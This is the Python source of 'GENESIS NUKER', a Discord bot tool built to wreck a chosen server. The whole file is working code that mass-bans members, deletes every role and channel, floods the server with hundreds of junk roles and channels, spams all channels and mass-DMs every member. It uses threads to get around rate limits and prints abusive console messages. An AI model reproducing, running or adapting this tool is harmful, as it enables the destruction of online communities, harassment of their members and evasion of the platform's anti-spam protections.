import discord, os, requests, colorama, random, sys, json, threading, ctypes, time
from colorama import Fore
colorama.init()
if sys.platform.startswith("win"):
    ctypes.windll.kernel32.SetConsoleTitleW("GENESIS NUKER || @siph.er")
else:
    pass
def ui():
    print(f"""
{Fore.CYAN}


  ▄████ ▓█████  ███▄    █ ▓█████   ██████  ██▓  ██████ 
 ██▒ ▀█▒▓█   ▀  ██ ▀█   █ ▓█   ▀ ▒██    ▒ ▓██▒▒██    ▒ 
▒██░▄▄▄░▒███   ▓██  ▀█ ██▒▒███   ░ ▓██▄   ▒██▒░ ▓██▄   
░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒▒▓█  ▄   ▒   ██▒░██░  ▒   ██▒             
░▒▓███▀▒░▒████▒▒██░   ▓██░░▒████▒▒██████▒▒░██░▒██████▒▒
 ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░░▓  ▒ ▒▓▒ ▒ ░
  ░   ░  ░ ░  ░░ ░░   ░ ▒░ ░ ░  ░░ ░▒  ░ ░ ▒ ░░ ░▒  ░ ░
░ ░   ░    ░      ░   ░ ░    ░   ░  ░  ░   ▒ ░░  ░  ░  
      ░    ░  ░         ░    ░  ░      ░   ░        ░ 
{Fore.RESET}
    {Fore.RED}xin#1111 | @siph.er | github.com/devil-xin{Fore.RESET}""")
client = discord.Client()
info = json.loads(open('assets/nuke/config.json','r').read())
ui()
def multi_clearer():
    if sys.platform.startswith("win"):
        os.system("cls")
    else:
        os.system("clear")
token = sys.argv[1]
headers = {'authorization' : f'Bot {token}'}
banlist = info['blacklist'].split()
def ban_user(user,guild):
    retries = 0
    while True:
        url = f"https://canary.discordapp.com/api/v6/guilds/{str(guild)}/bans/{str(user)}?delete-message-days=7&reason=sex"
        src = requests.put(url, headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
def cchan(name, server, type, array):
    retries = 0
    payload = {'name': name, 'type': 0}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/channels", headers=headers,json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            channel = src.json()['id']
            array.append(channel)
            break 
def delete_channel(channel):
    retries = 0
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/channels/{str(channel)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
def delete_role(role, server):
    retries = 0
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/roles/{str(role)}", headers=headers)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
def message_spam(message,channel):
    retries = 0
    payload = {"content": message, "tts": False}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{str(channel)}/messages", headers=headers, json=payload,timeout=10)
        if src.status_code == 429:
            retries += 1
            time.sleep(1)
            if retries == 5:
                break
        else:
            break
def create_role(name, server):
    retries = 0
    payload = {'hoist': 'true', 'name': name, 'mentionable': 'true', 'color': random.randint(1000000,9999999), 'permissions': random.randint(1,10)}
    while True:
        src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{server}/roles', headers=headers, json=payload)
        if src.status_code == 429:
            retries += 1
            time.sleep(3)
            if retries == 5:
                break
        else:
            break

def massdm(user, content, headers, queue, dmed, not_dmed):
    retries = 0
    payload = {'recipient_id': user}
    src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
    dm_json = json.loads(src.content)
    payload = {"content" : content, "tts" : False}
    if 'Cannot send messages to this user' in src.text:
        queue.acquire()
        not_dmed.append(user)
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || GENESTELLA || DMED : {len(dmed)} || Not DMED: {len(not_dmed)} || @siph.er")
        else:
            pass
        queue.release()
    elif 'anti-spam' in src.text:
        queue.acquire()
        not_dmed.append(user)
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || GENESTELLA || DMED : {len(dmed)} || Not DMED: {len(not_dmed)} || FLAGGED LOL || @siph.er")
        else:
            pass
        print(f"[{Fore.RED}N/A{Fore.RESET}]Flagged XD..")
        queue.release()
    else:
        while True:
            src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{dm_json['id']}/messages", headers=headers, json=payload)
            print(src.text)
            if src.status_code == 429:
                retries += 1
                time.sleep(1)
                if retries == 10:
                    queue.acquire()
                    not_dmed.append(user)
                    if sys.platform.startswith("win"):
                        ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || GENESTELLA || DMED : {len(dmed)} || Not DMED: {len(not_dmed)} || @siph.er")
                    else:
                        pass
                    queue.release()
                    break
            if "You are being rate limited." in src.text:
                queue.acquire()
                not_dmed.append(user)
                if sys.platform.startswith("win"):
                    ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || GENESTELLA || DMED : {len(dmed)} || Not DMED: {len(not_dmed)} || @siph.er")
                else:
                    pass
                time.sleep(int(src.json()['retry_after'])/1000)
                queue.release()
                break
            try:
                src.json()['code']
                queue.acquire()
                not_dmed.append(user)
                if sys.platform.startswith("win"):
                    ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || GENESTELLA || DMED : {len(dmed)} || Not DMED: {len(not_dmed)} || @siph.er")
                else:
                    pass
                queue.release()
                break
            except:
                dmed.append(user)
                queue.acquire()
                if sys.platform.startswith("win"):
                    ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || GENESTELLA || DMED : {len(dmed)} || Not DMED: {len(not_dmed)} || @siph.er")
                else:
                    pass
                queue.release()
                break
            else:
                break
@client.event
async def on_ready():
    multi_clearer()
    ui()
    print(Fore.YELLOW + f"use this link to invite '{client.user}':\nhttps://discordapp.com/api/oauth2/authorize?client_id={client.user.id}&permissions=2147483639&scope=bot")
    print(Fore.RED + "List Of Guilds:" + Fore.RESET)
    if len(client.guilds) == 0:
        print(Fore.RED + "No servers :( || Closing...")
        print("Btw sorry, i tried to use os.system('exit') to close the console, but it wouldnt work, you might just have to manually close lol :)")
        exit()
    else:
        for guild in client.guilds:
            print(Fore.BLUE + f"{guild.name}({guild.member_count} Members) : {guild.id}" + Fore.RESET)
        print(Fore.WHITE + "Enter Guild ID(type 'reload' to reload servers):" + Fore.RESET)
        guild_id = input()
        if guild_id == "reload":
            print(Fore.RED + "Reloading...")
            multi_clearer()
            os.system(f"python assets/nuke/genesis-nuker.py {token}")
        else:
            try:
                guild = client.get_guild(int(guild_id))
            except:
                print(Fore.RED + "Dont enter a text you fucking nonce LOOOOOL || I'll reload the bot for you dumbass")
                time.sleep(4)
                multi_clearer()
                os.system(f"python assets/nuke/genesis-nuker.py {token}")
        if guild != None:
            channels = []
            multi_clearer()
            def guild_info():
                print(f"""
[{Fore.RED}N/A{Fore.RESET}]Guild Chosen: {Fore.GREEN}{guild.name}{Fore.RESET}
[{Fore.RED}N/A{Fore.RESET}]ID: {guild.id}
[{Fore.RED}N/A{Fore.RESET}]Roles: {len(guild.roles)}
[{Fore.RED}N/A{Fore.RESET}]Members: {len(guild.members)}""")
            guild_info() 
            print(f"""
Options:
[{Fore.RED}1{Fore.RESET}] {Fore.GREEN}MassDM{Fore.RESET}
[{Fore.RED}2{Fore.RESET}] {Fore.RED}MassBAN{Fore.RESET}
[{Fore.RED}3{Fore.RESET}] {Fore.CYAN}Delete & Create Roles{Fore.RESET}
[{Fore.RED}4{Fore.RESET}] {Fore.MAGENTA}Delete & Create Channels{Fore.RESET}
[{Fore.RED}5{Fore.RESET}] {Fore.YELLOW}Spam Channels{Fore.RESET}

Enter Numbers in order of how you want to run the nuker (Or Just Enter The Numbers you wanna do):\n\n""")    
            order = input().split()
            if len(order) == 0:
                print(f"[{Fore.RED}N/A{Fore.RESET}] You Have Not Even Entered A Number lol you dumb fuck") 
            else:
                queue = threading.Semaphore(value=1)
                for number in order:
                    if number == "1":
                        dmed = []
                        not_dmed = []
                        multi_clearer()
                        ui()
                        guild_info() 
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || SENDING DMS || @siph.er")
                        else:
                            pass
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Sending DMS...")
                        for member in guild.members:
                            threading.Thread(target=massdm,args=[member.id, info['msg'], headers, queue, dmed, not_dmed]).start()
                    #####################################################################################
                    elif number == "2":
                        multi_clearer()
                        ui()
                        guild_info()
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || BANNING MEMBERS || Number {number} || @siph.er")
                        else:
                            pass
                        counting = 0
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Banning members..." + Fore.RESET)
                        for member in guild.members:
                            if str(member.id) in banlist:
                                print(Fore.RED + f"Not banning {member.name}" + Fore.RESET)
                            else:
                                threading.Thread(target=ban_user,args=[member.id,guild.id]).start()
                                counting +=1
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Banned {counting} members")
                        
                    #####################################################################################
                    elif number == "3":      
                        multi_clearer()
                        ui()
                        guild_info()
                        x = 0
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || DELETING ROLES || @siph.er")
                        else:
                            pass
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Deleting roles..."+ Fore.RESET)
                        for role in guild.roles:
                            threading.Thread(target=delete_role,args=[role.id,guild.id]).start()
                            x += 1
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Deleted {x} roles..."+ Fore.RESET)
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || CREATING ROLES || @siph.er")
                        else:
                            pass
                        multi_clearer()
                        ui()
                        guild_info()
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Creating roles..."+ Fore.RESET)
                        for x in range(100):
                            threading.Thread(target=create_role,args=[info['role'],guild.id]).start()
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Created {x} roles..."+ Fore.RESET)
                    #####################################################################################
                    elif number == "4":          
                        multi_clearer()
                        ui()
                        guild_info()
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || DELETING CHANNELS || @siph.er")
                        else:
                            pass
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Deleting channels..." + Fore.RESET)
                        for channel in guild.channels:
                            threading.Thread(target=delete_channel, args=[channel.id]).start()
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || CREATING CHANNELS AND WEBHOOKS || @siph.er")
                        else:
                            pass
                        multi_clearer()
                        ui()
                        guild_info()
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Creating channels and webhooks..." +Fore.RESET)
                        for y in range(250):
                            threading.Thread(target=cchan,args=[info['channel'],guild.id,"text",channels]).start()
                    #####################################################################################
                    elif number == "5":
                        multi_clearer()
                        ui()
                        guild_info()
                        if sys.platform.startswith("win"):
                            ctypes.windll.kernel32.SetConsoleTitleW(f"GENESIS NUKER || SPAMMING CHANNELS || @siph.er")
                        else:
                            pass
                        print(f"[{Fore.RED}N/A{Fore.RESET}]Spamming channels...\nPS this may be slow due to rate limits so sorry :(")
                        if len(channels) == 0:
                            for x in range(50):
                                for channel in guild.channels:
                                    threading.Thread(target=message_spam,args=[info['spam'],channel.id]).start()
                        else:
                            for x in range(50):
                                for channel in channels:
                                    threading.Thread(target=message_spam,args=[info['spam'],channel]).start()
                    #####################################################################################    
            
        else:
            multi_clearer()
            print("Server is invalid...")
            time.sleep(4)
            os.system(f"python assets/nuke/genesis-nuker.py {token}")
    
try:
    client.run(token)
except Exception as e:
    print(Fore.RED + "Error occured attempting to log in to token... Error will be shown below"+ Fore.RESET)
    time.sleep(1)
    print(Fore.WHITE + f"{e}\nPS: this will close in 5 seconds..." + Fore.RESET)
    time.sleep(5)
    os.system("exit")